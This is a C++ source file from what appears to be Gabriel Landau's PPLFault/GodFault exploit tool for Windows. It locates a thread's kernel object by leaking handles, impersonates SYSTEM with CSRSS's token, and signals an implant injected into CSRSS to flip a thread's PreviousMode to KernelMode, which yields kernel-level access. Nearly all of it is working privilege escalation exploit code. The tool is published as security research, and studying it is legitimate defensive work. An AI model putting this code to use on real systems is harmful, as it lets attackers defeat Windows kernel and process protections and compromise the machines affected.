// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include "Payload.h"
#include "GMShellcode.h"
#include "resource.h"
#include "Logging.h"
#include <stdio.h>
#include <string>
#include <TlHelp32.h>
#include <vector>

// Locates the KTHREAD for the given thread ID
// Note that this returns a kernel address
PVOID FindKTHREAD(DWORD dwThreadId)
{
    NTSTATUS ntStatus = NULL;
    PVOID pThread = NULL;
    PSYSTEM_HANDLE_INFORMATION pInfo = NULL;
    std::string buf;

    // Create a handle to the thread
    HANDLE hThread = OpenThread(SYNCHRONIZE, FALSE, dwThreadId);
    if (!hThread)
    {
        Log(Error, "Failed to open my own thread?!?");
        goto Cleanup;
    }

    // Get a list of all handles on the system
    do
    {
        buf.resize(buf.empty() ? (1024 * 1024) : (buf.size() * 2));
        ntStatus = NtQuerySystemInformation(SystemHandleInformation, &buf[0], (ULONG)buf.size(), NULL);
    } while (STATUS_INFO_LENGTH_MISMATCH == ntStatus);

    if (!NT_SUCCESS(ntStatus))
    {
        Log(Error, "NtQuerySystemInformation(SystemHandleInformation) failed with NTSTATUS 0x%08x", ntStatus);
        goto Cleanup;
    }

    pInfo = (PSYSTEM_HANDLE_INFORMATION)&buf[0];
    for (ULONG i = 0; i < pInfo->NumberOfHandles; i++)
    {
        const SYSTEM_HANDLE_TABLE_ENTRY_INFO& info = pInfo->Handles[i];

        // Find the entry that corresponds to the the handle we created above
        // It will have our PID, and the same handle value
        if ((GetCurrentProcessId() == info.UniqueProcessId) && ((USHORT)(ULONG_PTR)hThread == info.HandleValue))
        {
            // Return the pointer
            pThread = info.Object;
            goto Cleanup;
        }
    }

Cleanup:
    CloseHandle(hThread);
    return pThread;
}

// Impersonate CSRSS, which runs as SYSTEM
bool GetSystem()
{
    HANDLE hToken = NULL;
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    CsrGetProcessId_t pCsrGetProcessId = (CsrGetProcessId_t)GetProcAddress(hNtdll, "CsrGetProcessId");
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pCsrGetProcessId());
    
    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
    {
        CloseHandle(hProcess);
        return ImpersonateLoggedOnUser(hToken);
    }

    Log(Error, "Failed to open CSRSS's token");
    
    CloseHandle(hProcess);
    return false;
}

// Ask our CSRSS implant to set the given thread's PreviousMode to KernelMode using ANGRYORCHARD
bool BlessThread(DWORD dwThreadId, bool bFatal)
{
    bool bResult = false;
    HANDLE hMutex = NULL;
    HANDLE hReq = NULL;
    HANDLE hDone = NULL;
    HANDLE hSection = NULL;
    PVOID pThread = NULL;
    PIPC_SECTION pSection = NULL;
    bool bMustReleaseMutex = false;

    if (0 == dwThreadId)
    {
        goto Cleanup;
    }

    pThread = FindKTHREAD(dwThreadId);
    if (!pThread)
    {
        Log(Error, "Failed to find thread %u");
        goto Cleanup;
    }

    // Get SYSTEM in case we're only Admin
    if (!GetSystem())
    {
        Log(Warning, "Failed to impersonate SYSTEM.  This may break IPC if you're not already running as SYSTEM.");
    }

    hMutex = OpenMutexW(SYNCHRONIZE, FALSE, GLOBAL MUTEX_NAME_BASE);
    hReq = OpenEventW(EVENT_MODIFY_STATE, FALSE, GLOBAL REQ_NAME_BASE);
    hDone = OpenEventW(SYNCHRONIZE, FALSE, GLOBAL DONE_NAME_BASE);
    hSection = OpenFileMappingW(FILE_MAP_WRITE, FALSE, GLOBAL SECTION_NAME_BASE);
    
    if (!hMutex || !hReq || !hDone || !hSection)
    {
        if (bFatal)
        {
            Log(Error, "Server does not appear to be running.");
        }
        else
        {
            Log(Warning, "Server does not appear to be running.  Attempting to install it...");
        }
        goto Cleanup;
    }

    pSection = (PIPC_SECTION)MapViewOfFile(hSection, FILE_MAP_WRITE, 0, 0, 4096);
    if (!pSection)
    {
        Log(Error, "Failed to map IPC section.");
        goto Cleanup;
    }

    if (WAIT_OBJECT_0 != WaitForSingleObject(hMutex, 1000))
    {
        Log(Error, "Failed to acquire mutex.");
        goto Cleanup;
    }
    bMustReleaseMutex = true;

    // Send request
    pSection->pThread = pThread;
    pSection->ntStatus = STATUS_UNSUCCESSFUL;
    FlushViewOfFile(pSection, sizeof(*pSection));
    SetEvent(hReq);

    // Wait for ACK
    WaitForSingleObject(hDone, 1000);

    if (!NT_SUCCESS(pSection->ntStatus))
    {
        Log(Error, "Bless IPC failed with NTSTATUS 0x%08x.", pSection->ntStatus);
        goto Cleanup;
    }

    Log(Info, "Thread %u (KTHREAD %p) has been blessed by GodFault", dwThreadId, pThread);
    bResult = true;

Cleanup:
    if (bMustReleaseMutex) ReleaseMutex(hMutex);
    if (pSection) UnmapViewOfFile(pSection);
    if (hMutex) CloseHandle(hMutex);
    if (hReq) CloseHandle(hReq);
    if (hDone) CloseHandle(hDone);
    if (hSection) CloseHandle(hSection);

    RevertToSelf();

    return bResult;
}
